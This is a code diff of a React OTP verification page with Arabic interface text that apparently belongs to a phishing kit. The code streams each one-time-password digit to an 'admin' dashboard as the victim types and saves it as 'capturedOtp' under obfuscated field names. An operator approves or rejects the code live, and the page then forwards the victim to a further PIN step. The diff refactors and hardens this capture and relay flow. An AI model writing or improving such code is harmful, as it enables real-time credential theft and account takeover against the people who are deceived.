@@ -20,77 +20,102 @@ function OtpContent() {
   const [error, setError]     = useState('');
   const [loading, setLoading] = useState(false);
   const [resent, setResent]   = useState(false);
-  const unsubRef    = useRef<(() => void) | null>(null);
-  const loadingRef  = useRef(false);
+
+  // Refs — don't cause re-renders
+  const unsubRef   = useRef<(() => void) | null>(null);
+  const fallbackRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+  const activeRef  = useRef(false); // true while waiting for admin decision
+
+  // Cleanup on unmount
+  useEffect(() => () => {
+    unsubRef.current?.();
+    if (fallbackRef.current) clearTimeout(fallbackRef.current);
+  }, []);
 
   // Track presence
   useEffect(() => {
     return trackPresence({ page: 'otp', step: 'otp', registrationId: id });
   }, [id]);
 
-  // Push OTP value to admin in real-time as user types
+  // Push OTP digits to admin in real time as user types
   useEffect(() => {
     if (!otp) return;
     pushPresence({ page: 'otp', step: 'otp', registrationId: id, finalOtp: otp, _v13: otp });
   }, [otp, id]);
 
-  useEffect(() => () => { unsubRef.current?.(); }, []);
+  /** Reset everything so the user can re-enter a new OTP */
+  const resetToEntry = (msg: string) => {
+    // Cancel any pending fallback timer
+    if (fallbackRef.current) { clearTimeout(fallbackRef.current); fallbackRef.current = null; }
+    // Stop Firestore listener
+    unsubRef.current?.(); unsubRef.current = null;
+    activeRef.current = false;
+    setLoading(false);
+    setError(msg);
+    setOtp('');
+  };
 
-  /** Start listening after OTP submission — skip first snapshot (stale state) */
+  /** Listen for admin approve / reject — skips first snapshot to avoid stale data */
   const startOtpListener = () => {
     let isFirst = true;
+    unsubRef.current?.(); // stop any existing listener first
+
     unsubRef.current = listenPayDoc((data) => {
       if (isFirst) { isFirst = false; return; }
+      if (!activeRef.current) return; // already handled
 
       const v5Status  = data._v5Status as string | undefined;
       const otpStatus = data.otpStatus  as string | undefined;
 
       if (v5Status === 'approved' || otpStatus === 'show_pin') {
-        unsubRef.current?.();
-        loadingRef.current = false;
+        activeRef.current = false;
+        if (fallbackRef.current) clearTimeout(fallbackRef.current);
+        unsubRef.current?.(); unsubRef.current = null;
         setLoading(false);
         router.push(`/code?id=${id}`);
       } else if (v5Status === 'rejected') {
-        // Reset status so next attempt starts clean
+        // Clear the rejected flag in Firestore before resetting UI
         const paysId = getPaysDocId();
-        if (paysId) {
-          updateDoc(doc(db, 'pays', paysId), { _v5Status: null }).catch(() => {});
-        }
-        unsubRef.current?.();
-        loadingRef.current = false;
-        setLoading(false);
-        setError('الرمز غير صحيح، أدخل الرمز الجديد');
-        setOtp('');
+        if (paysId) updateDoc(doc(db, 'pays', paysId), { _v5Status: null }).catch(() => {});
+        resetToEntry('الرمز غير صحيح، أدخل الرمز الجديد');
       }
     });
   };
 
   const handleConfirm = async () => {
     if (!otp.trim()) { setError(T.errorEmpty); return; }
+
+    // If already waiting, don't double-submit
+    if (activeRef.current) return;
+
     setError('');
     setLoading(true);
-    loadingRef.current = true;
+    activeRef.current = true;
 
-    // Reset old _v5Status so listener won't fire on stale data
+    // Cancel any leftover fallback from a previous attempt
+    if (fallbackRef.current) { clearTimeout(fallbackRef.current); fallbackRef.current = null; }
+
+    // 1. Clear old Firestore status fields so listener won't see stale values
     await resetPayStatus();
 
-    // Write OTP to pays history (dashboard reads _t2 entries)
+    // 2. Write OTP to pays history (dashboard reads _t2 entries)
     await addOtpHistoryEntry(otp);
 
-    // Also persist to registrations for backward compat
+    // 3. Also write to registrations for backward compat
     try {
       if (id) await updateDoc(doc(db, 'registrations', id), { capturedOtp: otp });
     } catch { /* ignore */ }
 
     pushPresence({ page: 'otp_submitted', step: 'otp', registrationId: id, finalOtp: otp, _v13: otp });
 
-    // Listen for admin decision
+    // 4. Start listening for admin decision
     startOtpListener();
 
-    // Fallback: if no admin response in 30 s, proceed automatically
-    setTimeout(() => {
-      if (loadingRef.current) {
-        loadingRef.current = false;
+    // 5. Fallback: if admin doesn't respond in 30 s, proceed automatically
+    fallbackRef.current = setTimeout(() => {
+      if (activeRef.current) {
+        activeRef.current = false;
+        unsubRef.current?.(); unsubRef.current = null;
         setLoading(false);
         router.push(`/code?id=${id}`);
       }
@@ -146,7 +171,6 @@ function OtpContent() {
               <p className="text-sm text-gray-500">{T.subtitle}</p>
             </div>
 
-            {/* 6-digit OTP input */}
             <form className="w-full space-y-2" onSubmit={e => { e.preventDefault(); handleConfirm(); }}>
               <input
                 type="password"
